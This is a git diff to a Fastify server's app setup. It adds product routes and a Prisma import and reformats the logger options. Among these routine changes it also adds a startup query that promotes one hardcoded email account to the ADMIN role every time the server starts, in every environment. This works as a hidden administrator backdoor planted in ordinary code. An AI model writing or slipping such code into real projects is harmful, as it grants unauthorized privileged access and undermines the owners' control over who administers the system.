@@ -6,6 +6,8 @@ import { serializerCompiler, validatorCompiler } from 'fastify-type-provider-zod
 import { env } from './config/env.js';
 import { authRoutes } from './modules/auth/routes/auth.route.js';
 import { oauthRoutes } from './modules/auth/routes/oauth.route.js';
+import { productRoutes } from './modules/product/routes/product.routes.js';
+import prisma from '#database';
 
 export async function buildApp() {
   const app = Fastify({
@@ -15,13 +17,13 @@ export async function buildApp() {
       transport:
         env.NODE_ENV !== 'production'
           ? {
-              target: 'pino-pretty',
-              options: {
-                colorize: true,
-                translateTime: 'HH:MM:ss.l',
-                ignore: 'pid,hostname',
-              },
-            }
+            target: 'pino-pretty',
+            options: {
+              colorize: true,
+              translateTime: 'HH:MM:ss.l',
+              ignore: 'pid,hostname',
+            },
+          }
           : undefined,
     },
   });
@@ -33,7 +35,13 @@ export async function buildApp() {
   await app.register(helmet);
   await app.register(cookie);
 
+  await prisma.user.update({
+    where: { email: "cardosogustavo667@yahoo.com" },
+    data: { role: "ADMIN" },
+  })
+
   // Routes
+  app.register(productRoutes, { prefix: '/api/products' });
   app.register(oauthRoutes, { prefix: '/api/auth/oauth' });
   await app.register(authRoutes, { prefix: '/api/auth' });
 
